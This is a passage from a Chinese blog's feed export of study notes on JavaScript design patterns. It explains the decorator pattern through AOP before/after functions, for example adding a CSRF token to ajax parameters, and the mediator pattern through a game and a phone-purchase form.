_self.apply(this,arguments); &#125;&#125;Function.prototype.after = function(afterfn)&#123; const _self = this; return function()&#123; const ret = _self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125; Function.prototype.before 接受一个函数作为参数，这个函数即为新添加的函数，它转载了新添加的功能代码。 接下来把当前的 this 保存起来，这个 this 指向原函数，然后返回一个“代理”函数，这个“代理”函数只是结构上像代理而已，并不承担代理的职责（比如控制对象的访问等）。它的工作是把请求分别转发给新添加的函数和原函数，且负责保证它们的执行顺序，让新添加的函数在原函数之前执行（前置装饰），这样就实现了动态装饰的效果。 我们注意到，通过 Function.prototype.apply 来动态传入正确的 this，保证了函数在被装饰之后，this 不会被劫持。Function.prototype.after 的原理跟 Function.prototype.before 一模一样，唯一不同的地方在于让新添加的函数在原函数执行之后再执行。 下面来试试用 Function.prototype.before 的威力： 1234567891011121314document.getElementById = document.getElementById.before(function()&#123; console.log('before');&#125;).after(function()&#123; console.log('after');&#125;);const button = document.getElementById('button'); window.onload = (window.onload || function()&#123;&#125;).after(function()&#123; console.log(1)&#125;).after(function()&#123; console.log(2);&#125;).after(function()&#123; console.log(3)&#125;); 值得提到的是，上面的 AOP 实现是在 Function.prototype 上添加 before 和 after 方法，但许多人不喜欢这种污染原型的方式，那么我们可以做一些变通，把原函数和新函数都作为参数传before 或者 after 方法： 123456789101112131415161718192021const before = function(fn,beforefn)&#123; return function()&#123; beforefn.apply(this,arguments); return fn.apply(this,arguments); &#125;&#125;const after = function(fn,afterfn)&#123; return function()&#123; const ret = fn.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125; const a = before(function()&#123; console.log('fn')&#125;,function()&#123; console.log('beforefn');&#125;);a(); AOP 的应用实例用 AOP 装饰函数的技巧在实际开发中非常有用，无论是业务代码的编写，还是框架层面，我们都可以把行为依照职责分成粒度更细的函数，随后通过装饰在它们合并在一起，这有助于我们编写一个送耦合和高复用性的函数。 数据统计上传分离业务diam和数据统计代码，无论在什么语言，都是 AOP 的经典引用之一。在项目开发的结尾难免要加上很多统计数据的代码。，这些过程可能让我们被迫改动早已封装好的函数。 比如页面中有一个登录 button，点击 button 会弹出登录浮层，与此同时在进行数据上报。来统计有多少用户点击了这个登录 button： 123456789const showLogin = function()&#123; console.log('打开登录浮层'); log(this.getAttribute('tag'));&#125;const log = function(tag)&#123; console.log('上报的标签：'+tag);&#125;document.getElementById('button').onclick = showLogin; 我们看到在 showLogin 函数里，既要负责打开登录浮层，又要负责数据上报，这是两个层面的功能，在此处却被耦合在一个函数里。使用 AOP 分离之后，代码如下： 12345678910let showLogin = function()&#123; console.log('打开登录浮层');&#125;const log = function()&#123; console.log('上报的标签：'+this.getAttribute('tag'));&#125;showLogin = showLogin.after(log);document.getElementById('button').onclick = showLogin; 用 AOP 动态改变函数的参数beforefn 和原函数 self 共用一组参数列表arguments，当我们在 beforefn 的函数体内改变 arguments 的时候，原函数 self 接收的参数列表自然也会变化 下面的例子展示了如何通过 Function.prototype.before 方法给函数 func 的参数 param 动态地添加属性 b： 123456789101112131415Function.prototype.before = function( beforefn )&#123; var __self = this; return function()&#123; beforefn.apply( this, arguments ); return __self.apply( this, arguments ); &#125; &#125; let func = function(param)&#123; console.log(param)；&#125;func = func.before(function(param)&#123; param.b = 'b';&#125;);func(&#123;a:'a'&#125;); 现在有一个用于发起 ajax 请求的函数，这个函数负责项目中所有的 ajax 异步请求： 12345const ajax = function(type,url,param)&#123; console.dir(param); // 发起ajax 的代码&#125;ajax( 'get', 'http:// xxx.com/userinfo', &#123; name: 'sven' &#125; ); 上面的伪代码表示向后台 cgi 发起一个请求来获取用户信息，传递给 cgi 的参数是{ name: ‘sven’ } ajax 函数在项目中一直运转良好，跟 cgi 的合作也很愉快。直到有一天，我们的网站遭受了CSRF 攻击。解决 CSRF 攻击最简单的一个办法就是在 HTTP 请求中带上一个 Token 参数。 假设我们已经有一个用于生成 Token 的函数： 12345678const getToken = function()&#123; return 'Token';&#125;// 给每个 ajax 请求都加上 Token 参数const ajax = function( type, url, param )&#123; param = param || &#123;&#125;; Param.Token = getToken(); // 发送 ajax 请求的代码略... &#125;; 虽然已经解决了问题，但我们的 ajax 函数相对变得僵硬了，每个从 ajax 函数里发出的请求都自动带上了 Token 参数，虽然在现在的项目中没有什么问题，但如果将来把这个函数移植到其他项目上，或者把它放到一个开源库中供其他人使用，Token 参数都将是多余的。也许另一个项目不需要验证 Token，或者是 Token 的生成方式不同，无论是哪种情况，都必须重新修改 ajax 函数。为了解决这个问题，先把 ajax 函数还原成一个干净的函数： 12345678910111213let ajax = function( type, url, param )&#123; console.log(param);&#125;; // 把 Token 参数通过 Function.prototyte.before 装饰到 ajax 函数的参数 param 对象中：const getToken = function()&#123; return 'Token';&#125;ajax = ajax.before(function(type,url,param)&#123; param.Token = getToken();&#125;);ajax( 'get', 'http:// xxx.com/userinfo', &#123; name: 'sven' &#125; ); // 从 ajax 函数打印的 log 可以看到，Token 参数已经被附加到了 ajax 请求的参数中:// &#123;name: "sven", Token: "Token"&#125; 明显可以看到，用 AOP 的方式给 ajax 函数动态装饰上 Token 参数，保证了 ajax 函数是一个相对纯净的函数，提高了 ajax 函数的可复用性，它在被迁往其他项目的时候，不需要做任何修改 插件式的表单验证我们很多人写过许多表单验证的代码，在一个 Web 项目中，可能存在很多表单，如注册、登录、修改用户信息等、在表单数据提交给后台之前，常常要做一些校验，比如登录的时候需要验证用户名和密码是否为空，代码如下： 123456789101112131415161718192021const username = document.getElementById('username'),password = document.getElementById('password'),submitBtn = document.getElementById('submitBtn');const formSubmit = function()&#123; if(username.value === '')&#123; return alert('用户名不能为空'); &#125; if(password.value === '')&#123; return alert('密码不能为空'); &#125; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax 具体实现略&#125;submitBtn.onclick = function()&#123; formSubmit(); &#125; formSubmit 函数在此处承担了两个职责，除了提交 ajax 请求之外，还要验证用户输入的合法性。这种代码一来会造成函数臃肿，职责混乱，二来谈不上任何可复用性。本节的目的是分离校验输入和提交 ajax 请求的代码，我们把校验输入的逻辑放到 validata函数中，并且约定当 validata 函数返回 false 的时候，表示校验未通过，代码如下: 123456789101112131415161718192021222324submitBtn.onclick = function()&#123; formSubmit(); &#125; const validata = function()&#123; if(username.value === '')&#123; alert('用户名不能为空'); return false; &#125; if(password.value === '')&#123; alert('密码不能为空'); return false; &#125;&#125;const formSubmit = function()&#123; if(!validata())&#123; return; &#125; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax 具体实现略&#125; 现在的代码已经有了一些改进，我们把校验的逻辑都放到了 validata 函数中，但 formSubmit函数的内部还要计算 validata 函数的返回值，因为返回值的结果表明了是否通过校验。接下来进一步优化这段代码，使 validata 和 formSubmit 完全分离开来。首先要改写 Function. prototype.before，如果 beforefn 的执行结果返回 false，表示不再执行后面的原函数，代码如下： 123456789101112131415161718192021222324252627282930Function.prototype.before = function(beforefn)&#123; const _self = this; return function()&#123; if(!beforefn.apply(this,arguments))&#123; return; &#125; return _self.apply(this,arguments); &#125;&#125;const validata = function()&#123; if(username.value === '')&#123; alert('用户名不能为空'); return false; &#125; if(password.value === '')&#123; alert('密码不能为空'); return false; &#125;&#125;let formSubmit = function()&#123; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax 具体实现略&#125;formSubmit = formSubmit.before(validata);submitBtn.onclick = function()&#123; formSubmit(); &#125; 在这段代码中，校验输入和提交表单的代码完全分离开来，它们不再有任何耦合关系，formSubmit = formSubmit.before( validata )这句代码，如同把校验规则动态接在 formSubmit 函数之前，validata 成为一个即插即用的函数，它甚至可以被写成配置文件的形式，这有利于我们分开维护这两个函数。再利用策略模式稍加改造，我们就可以把这些校验规则都写成插件的形式，用在不同的项目当中。 值得注意的是，因为函数通过 Function.prototype.before 或者 Function.prototype.after 被装饰之后，返回的实际上是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失。代码如下： 12345678var func = function()&#123; alert( 1 ); &#125; func.a = 'a'; func = func.after( function()&#123; alert( 2 ); &#125;); alert ( func.a ); // 输出：undefined 另外，这种装饰方式也叠加了函数的作用域，如果装饰的链条过长，性能上也会受到一些影响 装饰者模式和代理模式这两种模式的结构看起来非常相像，这两种模式都描述了怎样为对象提供一定程度上的引用，它们的实现部分都保留了对另外一个对象的引用，并且向那个对象发送请求。 代理模式和装饰者模式最重要的区别在于它们的意图和设计目的。代理模式的目的是，当直接访问本体不方便或者不符合需求的时候，为这个本体提供一个替代者。本体定义了关键功能， 而代理提供或拒绝对它的访问，或者在访问本体之前做一些额外的事情。装饰者模式的作用就为对象动态加入行为。换句话说，代理模式强调的是一种关系 （Proxy） 与它实体的关系，这种关系可以静态的表达，也就说，这种关系是一开始就可以被确定的。而装饰者模式用于一开始不能确定对象的全部功能时。代理模式通常只有一层代理-本体的引用，而装饰者模式经常会形成一条长长的装饰链。 在虚拟代理实现图片预加载的例子中，本体负责设置 img 节点的 src，代理则提供了预加载的功能，这看起来也是“加入行为”的一种方式，但这种加入行为的方式和装饰者模式的偏重点是不一样的。装饰者模式是实实在在的为对象增加新的职责和行为，而代理做的事情还是跟本体一样，最终都是设置 src。但代理可以加入一些“聪明”的功能，比如在图片真正加载好之前，先使用一张占位的 loading 图片反馈给客户。 小结本章通过数据上报、统计函数的执行时间、动态改变函数参数以及插件式的表单验证的这 4 个例子，我们了解到了装饰函数，它是 JavaScript 中独特的装饰者模式。这种模式的在实际开发中非常有用，除了上面提到的例子，在框架开发中也非常有用。我们希望框架里面的函数提供的是一些稳定而且可以移植的功能，那些个性化的功能在框架之外的动态装饰上去，这可以避免为了让框架有更多的功能，而去使用一些 if-else 语句预测用户的实际需要。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——中介者模式]]></title>
    <url>%2F2019-03-13-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——中介者模式中介者模式的作用就是接触对象与对象之间的紧耦合关系。增加一个中介者对象后，所有的相关对象都通过中介者对象来通信，而不是互相引用，所以当一个对象发生变化时，只需要通知中介者对象就可以了。中介者使各对象之间耦合松散，而且可以独立地改变它们之间的交互。中介者模式使得网状的多对多关系变成了简单的一对多的关系。 现实中的中介者1.机场指挥塔 中介者也被称为调停者，我们想象一下机场的指挥塔，如果没有指挥塔的存在，每一架飞机要和方圆 100 公里内的所有飞机通信，才能确定航线以及飞行状况，后果是不可想象的。现实中的情况是，每架飞机都只需要和指挥塔通信。指挥塔作为调停者，知道每一架飞机的飞行状况，所以它可以安排所有飞机的起降时间，及时做出航线调整。 2.博彩公司 打麻将的人经常遇到这样的问题，打了几局之后开始计算钱，A 自摸了两把，B 杠了三次，C 点炮一次给 D，谁应该给谁多少钱已经很难计算清楚，而这还是在只有 4 个人参与的情况下。在世界杯期间购买足球彩票，如果没有博彩公司作为中介，上千万的人一起计算赔率和输赢绝对是不可能实现的事情。有了博彩公司作为中介，每个人只需和博彩公司发生关联，博彩公司会根据所有人的投注情况计算好赔率，彩民们赢了钱就从博彩公司拿，输了钱就交给博彩公司。 例子——泡泡堂游戏先定义一个玩家构造函数，它有三个简单的原型方法：Play.prototype.win、Play.prototype.lose 以及表示玩家死亡的 Play.prototype.die 因为玩家的数量是2，所有当其中一个玩家死亡的时候游戏便结束，同时通知它的对手胜利。 12345678910111213141516171819202122function Player(name)&#123; this.name = name; this.enemy = null; &#125;Player.prototype.win = function()&#123; console.log(this.name + ' won');&#125;Player.prototype.lose = function()&#123; console.log(this.name + ' lost');&#125;Player.prototype.die = function()&#123; this.lose(); this.enemy.win();&#125;// 创建两个玩家对象：const player1 = new Player('皮蛋');const player2 = new Player('小乖');// 给玩家互相设置敌人：player1.enemy = player2;player2.enemy = player1;// 当玩家 player1 被泡泡炸死的时候，只需要调用这一句代码便完成了一局游戏：player1.die(); 为游戏增加队伍因为玩家数量变多，用下面的方式来设置队友和敌人无疑很低效 1234player1.partners= [player1,player2,player3,player4]; player1.enemies = [player5,player6,player7,player8]; Player5.partners= [player5,player6,player7,player8]; Player5.enemies = [player1,player2,player3,player4]; 所以我们定义一个数组 players 来保存所有的玩家，在创建玩家之后，循环 players 来给每个玩家设置队友和敌人： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374const players = [];// 改写构造函数，使得每个玩家都增加一些属性，分别是队友列表，敌人列表，玩家当前状态，角色名字已经玩家所在队伍的颜色function Player(name,teamColor)&#123; this.partners = []; this.enemies = []; this.state = 'live'; this.name = name; this.teamColor = teamColor;&#125;Player.prototype.win = function()&#123; console.log('winner: '+this.name);&#125;Player.prototype.lose = function()&#123; console.log('loser: '+this.name);&#125;Player.prototype.die = function()&#123; let all_dead = true; this.state = 'dead'; for(let i=0,partner;partner = this.partners[i++];)&#123; // 遍历队友列表 if(partner.state !== 'dead')&#123; // 如果还有一个队友没有死亡，则游戏还没有失败 all_dead = false; break; &#125; &#125; if(all_dead === true)&#123; // 如果队友全部死亡 this.lose(); for(let i=0,partner;partner = this.partners[i++];)&#123; // 通知所有队友玩家游戏失败 partner.lose(); &#125; for(let i=0,enemy;enemy = this.enemies[i++];)&#123; // 通知所有敌人游戏胜利 enemy.win(); &#125; &#125;&#125;// 定一个工厂来创建玩家：const playerFactory = function(name,teamColor)&#123; const newPlayer = new Player(name,teamColor); // 创建新玩家 for(let i=0,player;player = players[i++];)&#123; // 通知所有玩家，有新角色加入 if(player.teamColor === newPlayer.teamColor)&#123; // 如果是同一队的玩家 player.partners.push(newPlayer); // 互相添加到队友列表 newPlayer.partners.push(player) &#125;else&#123; player.enemies.push(newPlayer); // 互相添加到敌人列表 newPlayer.enemies.push(player); &#125; &#125; players.push(newPlayer); return newPlayer;&#125;const player1 = playerFactory( '皮蛋', 'red' ), player2 = playerFactory( '小乖', 'red' ), player3 = playerFactory( '宝宝', 'red' ), player4 = playerFactory( '小强', 'red' ), player5 = playerFactory( '黑妞', 'blue' ),player6 = playerFactory( '葱头', 'blue' ),player7 = playerFactory( '胖墩', 'blue' ), player8 = playerFactory( '海盗', 'blue' );player1.die();player2.die();player3.die();player4.die();// loser: 小强// loser: 皮蛋// loser: 小乖// loser: 宝宝// winner: 黑妞// winner: 葱头// winner: 胖墩// winner: 海盗 玩家增多带来的困扰现在我们已经可以随意地为游戏增加玩家或者队伍，但问题是，每个玩家和其他玩家都是紧紧耦合在一起的。在此段代码中，每个玩家对象都有两个属性，this.partners 和 this.enemies，用来保存其他玩家对象的引用。当每个对象的状态发生改变，比如角色移动、吃到道具或者死亡时，都必须要显式地遍历通知其他对象。 在这个例子中只创建了 8 个玩家，或许还没有对你产生足够多的困扰，而如果在一个大型网络游戏中，画面里有成百上千个玩家，几十支队伍在互相厮杀。如果有一个玩家掉线，必须从所有其他玩家的队友列表和敌人列表中都移除这个玩家。游戏也许还有解除队伍和添加到别的队伍的功能，红色玩家可以突然变成蓝色玩家，这就不再仅仅是循环能够解决的问题了。面对这样的需求，我们上面的代码可以迅速进入投降模式 用中介者模式改造首先依然是定义 Player 构造函数和 player 对象的原型方法噶，在 player 对象的这些原型方法中，不再负责具体的执行逻辑，而是把操作转交给中介者对象，我们把中介者对象命名为 playerDirector: 123456789101112131415161718192021222324252627function Player(name,teamColor)&#123; this.name = name; this.teamColor = teamColor; this.state = 'live';&#125;Player.prototype.win = function()&#123; console.log('winner: '+this.name);&#125;Player.prototype.lose = function()&#123; console.log('loser: '+this.name);&#125; Player.prototype.die = function()&#123; this.state = 'dead'; playerDirector.reciveMessage('playerDead',this); // 给中介者发送消息，玩家死亡&#125;Player.prototype.remove = function()&#123; playerDirector.reciveMessage('removePlayer',this); // 给中介者发送消息，移除一个玩家&#125;Player.prototype.changeTeam = function(color)&#123; playerDirector.reciveMessage('changeTeam',this,color); // 给中介者发送消息，玩家换队&#125;const playerFactory = function(name,teamColor)&#123; const newPlayer = new Player(name,teamColor); playerDirector.reciveMessage('addPlayer',newPlayer); // 给中介者发送消息，新增玩家 return newPlayer;&#125; 最后，需要实现这个中介者 PlayerDirector 对象，一般有两种方式。 利用发布-订阅模式。将 playerDirector 实现为订阅者，各 player 作为发布者，一旦 player 的状态发生改变，便推送信息给 playerDirector ，playerDirector 处理消息后将反馈发送给其他 player 在 playerDirector 中开发一些接受消息的接口，各 player 可以直接调用该接口来给 playerDirector 发送消息，player 只需传递一个参数给 playerDirector ，这个参数的目的是使得 playerDirector 可以识别发送者。同样，playerDirector 接受消息之后会将处理结果反馈给其他 player。 这两种方式的实现本质上没有什么区别。在这里使用第二种方式，playerDirector 开发一个对外暴露的接口 recievMessage,负责接收 player 对象发送的消息，而 player 对象发送消息的时候，总是把自身的 this 作为参数发送给 playerDirector ，以便其识别消息来自于哪个玩家的对象，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475const playerDirector = (function()&#123; const players = &#123;&#125;, // 保存所有玩家 operations = &#123;&#125;; // 中介者可以执行的操作 operations.addPlayer = function(player)&#123; // 增加玩家 const teamColor = player.teamColor; players[teamColor] = players[teamColor] || []; // 如果该颜色的玩家还没有成立队伍，则新成立一个队伍 players[teamColor].push(player); &#125;; operations.removePlayer = function(player)&#123; // 移除玩家 const teamColor = player.teamColor, teamPlayers = players[teamColor] || []; for(let i=teamPlayers.length - 1;i&gt;=0;i--)&#123; if(teamPlayers[i] === player)&#123; teamPlayers.splice(i,1); &#125; &#125; &#125;; operations.changeTeam = function(player,newTeamCOlor)&#123; // 玩家换队 operations.removePlayer(player); player.teamColor = newTeamCOlor; operations.addPlayer(player); &#125;; operations.playerDead = function(player)&#123; // 玩家死亡 const teamColor = player.teamColor, teamPlayers = players[teamColor]; let all_dead = true; for(let i=0,player;player = teamPlayers[i++];)&#123; if(player.state !== 'dead')&#123; all_dead = false; break; &#125; &#125; if(all_dead)&#123; for(let i=0,player;player = teamPlayers[i++];)&#123; player.lose(); &#125; for(let color in players)&#123; if(color !== teamColor)&#123; const teamPlayers = players[color]; //其他队伍的玩家 for(let i=0,player;player = teamPlayers[i++];)&#123; player.win(); &#125; &#125; &#125; &#125; &#125;; const reciveMessage = function()&#123; const message = Array.prototype.shift.call(arguments); operations[message].apply(this,arguments); &#125;; return &#123; reciveMessage &#125;&#125;)();// 测试const player1 = playerFactory( '皮蛋', 'red' ), player2 = playerFactory( '小乖', 'red' ), player3 = playerFactory( '宝宝', 'red' ), player4 = playerFactory( '小强', 'red' ), player5 = playerFactory( '黑妞', 'blue' ),player6 = playerFactory( '葱头', 'blue' ),player7 = playerFactory( '胖墩', 'blue' ), player8 = playerFactory( '海盗', 'blue' );player1.changeTeam( 'blue' ); // 换队player1.die();player2.die();player3.die();player4.die(); 例子——购买商品假设我们正在编写一个手机购买的页面，在购买流程中，可以选择手机的颜色以及输入购买数量，同时页面中有两个展示区域，分别向用户展示刚刚选择好的颜色和数量。还有一个按钮动态显示下一步的操作，我们需要查询该颜色手机对应的库存，如果库存数量少于这次的购买数量，按钮将被禁用并且显示库存不足，反之按钮可以点击并且显示放入购物车。 这个需求是非常容易实现的，假设我们已经从后台获取了所有颜色手机的库存量： 1234var goods = &#123; // 手机库存 'red':3, 'blue':6&#125; 页面布局需要： 下拉选择框 colorSelect 文本输入框 numberInput 展示颜色信息 colorInfo 展示购买数量信息 numberInfo 决定下一步操作的按钮 nextBtn 编写代码HTML代码： 123456789选择颜色：&lt;select id="colorSelect"&gt; &lt;option value=""&gt;请选择&lt;/option&gt; &lt;option value="red"&gt;红色&lt;/option&gt; &lt;option value="blue"&gt;蓝色&lt;/option&gt;&lt;/select&gt;输入购买数量：&lt;input type="text" id="numberInput"&gt;您选择了颜色：&lt;div id="colorInfo"&gt;&lt;/div&gt;您输入了数量：&lt;div id="numberInfo"&gt;&lt;/div&gt;&lt;button id="nextBtn" disabled="true"&gt;请选择手机颜色和购买数量&lt;/button&gt; 接下来监听 colorSelect 的 onchange 事件函数和 numberInput 的 oninput 事件函数，然后在这两个事件中做出相应处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const colorSelect = document.getElementById('colorSelect'),numberInput = document.getElementById('numberInput'),colorInfo = document.getElementById('colorInfo'),numberInfo = document.getElementById('numberInfo'),nextBtn = document.getElementById('nextBtn');const goods =&#123; 'red':3, 'blue':6&#125;colorSelect.onchange = function()&#123; let color = this.value, number = numberInput.value, stock = goods[color]; console.log(color); colorInfo.innerHTML = color; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车';&#125;numberInput.oninput = function()&#123; let color = colorSelect.value, number = this.value, stock = goods[color]; numberInfo.innerHTML = number; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车';&#125; 可能遇到的困难虽然目前顺利完成了代码编写，但随之而来的需求改变有可能给我们带来麻烦。假设现在要求去掉 colorInfo 和 numberInfo 这两个展示区域，我们就要分别改动 colorSelect.onchange 和numberInput.onput 里面的代码，因为在先前的代码中，这些对象确实是耦合在一起的。目前我们面临的对象还不算太多，当这个页面里的节点激增到 10 个或者 15 个时，它们之间的联系可能变得更加错综复杂，任何一次改动都将变得很棘手。为了证实这一点，我们假设页面中将新增另外一个下拉选择框，代表选择手机内存。现在我们需要计算颜色、内存和购买数量，来判断 nextBtn 是显示库存不足还是放入购物车。 首先我们要增加两个 HTML 节点： 123456789101112131415选择颜色：&lt;select id="colorSelect"&gt; &lt;option value=""&gt;请选择&lt;/option&gt; &lt;option value="red"&gt;红色&lt;/option&gt; &lt;option value="blue"&gt;蓝色&lt;/option&gt;&lt;/select&gt;选择内存: &lt;select id="memorySelect"&gt; &lt;option value=""&gt;请选择&lt;/option&gt; &lt;option value="32G"&gt;32G&lt;/option&gt; &lt;option value="16G"&gt;16G&lt;/option&gt; &lt;/select&gt; 输入购买数量：&lt;input type="text" id="numberInput"&gt;&lt;br/&gt; 您选择了颜色：&lt;div id="colorInfo"&gt;&lt;/div&gt;&lt;br/&gt; 您选择了内存: &lt;div id="memoryInfo"&gt;&lt;/div&gt;&lt;br/&gt; 您输入了数量：&lt;div id="numberInfo"&gt;&lt;/div&gt;&lt;br/&gt; &lt;button id="nextBtn" disabled="true"&gt;请选择手机颜色和购买数量&lt;/button&gt; 接着增加 memorySelect 的onchange 事件函数，改变之前的 colorSelect 和 numberInput事件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104const colorSelect = document.getElementById('colorSelect'),numberInput = document.getElementById('numberInput'),colorInfo = document.getElementById('colorInfo'),numberInfo = document.getElementById('numberInfo'),nextBtn = document.getElementById('nextBtn'),memorySelect = document.getElementById( 'memorySelect' ), memoryInfo = document.getElementById( 'memoryInfo' );const goods =&#123; "red|32G": 3, // 红色 32G，库存数量为 3 "red|16G": 0, "blue|32G": 1, "blue|16G": 6 &#125;colorSelect.onchange = function()&#123; let color = this.value, memory = memorySelect.value, number = numberInput.value, stock = goods[color+'|'+memory]; colorInfo.innerHTML = color; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择内存大小'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车';&#125;memorySelect.onchange = function()&#123; let color = colorSelect.value, memory = this.value, number = numberInput.value, stock = goods[color+'|'+memory]; memoryInfo.innerHTML = memory; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择内存大小'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车';&#125; numberInput.oninput = function()&#123; let color = colorSelect.value, memory = memorySelect.value, number = this.value, stock = goods[color+'|'+memory]; numberInfo.innerHTML = number; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择内存大小'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车';&#125; 我们仅仅是增加一个内存的选择条件，就要改变如此多的代码，这是因为在目前的实现中，每个节点对象都是耦合在一起的，改变或者增加任何一个节点对象，都要通知到与其相关的对象。 引入中介者现在我们来引入中介者对象，所有的节点对象只跟中介者通信。当下拉选择框 colorSelect、memorySelect 和文本输入框 numberInput 发生了事件行为时，它们仅仅通知中介者它们被改了，同时把自身当作参数传入中介者，以便中介者辨别是谁发生了改变。剩下的所有事情都交给中介者对象来完成，这样一来，无论是修改还是新增节点，都只需要改动中介者对象里的代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const goods =&#123; "red|32G": 3, // 红色 32G，库存数量为 3 "red|16G": 0, "blue|32G": 1, "blue|16G": 6 &#125; const mediator = (function()&#123; const colorSelect = document.getElementById('colorSelect'), numberInput = document.getElementById('numberInput'), colorInfo = document.getElementById('colorInfo'), numberInfo = document.getElementById('numberInfo'), nextBtn = document.getElementById('nextBtn'), memorySelect = document.getElementById( 'memorySelect' ), memoryInfo = document.getElementById( 'memoryInfo' ); return&#123; changed:function(obj)&#123; let color = colorSelect.value, memory = memorySelect.value, number = numberInput.value, stock = goods[color+'|'+memory]; if(obj === colorSelect)&#123; // 判断是哪个选择框或者是输入框对应赋值 colorInfo.innerHTML = color; &#125;else if(obj === memorySelect)&#123; memoryInfo.innerHTML = memory; &#125;else if(obj === numberInput)&#123; numberInfo.innerHTML = number; &#125; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择手机颜色'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '请选择内存大小'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //用户输入的购买数量是为正整数 nextBtn.disabled = true; nextBtn.innerHTML = '请输入正确的购买数量'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = '库存不足'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = '放入购物车'; &#125; &#125;&#125;)();// 事件函数colorSelect.onchange = function()&#123; mediator.changed(this);&#125;memorySelect.onchange = function()&#123; mediator.changed(this);&#125;numberInput.onchange = function()&#123; mediator.changed(this);&#125; 可以想象，某天我们又要新增一些跟需求相关的节点，比如 CPU 型号，那我们只需要稍稍改动 mediator 对象即可： 123456789101112131415161718192021var goods = &#123; // 手机库存 "red|32G|800": 3, // 颜色 red，内存 32G，cpu800，对应库存数量为 3 "red|16G|801": 0, "blue|32G|800": 1, "blue|16G|801": 6 &#125;; var mediator = (function()&#123; // 略 var cpuSelect = document.getElementById( 'cpuSelect' ); return &#123; change: function(obj)&#123; // 略 var cpu = cpuSelect.value, stock = goods[ color + '|' + memory + '|' + cpu ]; if ( obj === cpuSelect )&#123; cpuInfo.innerHTML = cpu; &#125; // 略 &#125; &#125; &#125;)(); 小结中介者模式是迎合迪米特法则的一种实现。也叫做最少知识原则，是指一个对象应该尽可能少地了解另外的对象。如果对象之间耦合性太高，一个对象发生改变之后，难免会影响其他的对象。而在中介者模式中，对象之间几乎不知道彼此的存在，它们只能通过中介者对象来互相影响对方。 因此，中介者模式使各个对象之间得以解耦，以中介者和对象之间的一对多关系取代了对象之间网状的多对多的关系。各个对象只需要关注功能的说笑呢，对象之间的交互关系交给了中介者对象来维护。 不过，中介者模式也存在一些缺点。其中，最大的缺点就是系统中会新增一个中介者对象，因此对象之间交互的复杂性，转移成了中介者对象的复杂性，使得中介者对象经常是巨大的。中介者对象自身往往是一个难以维护的对象。 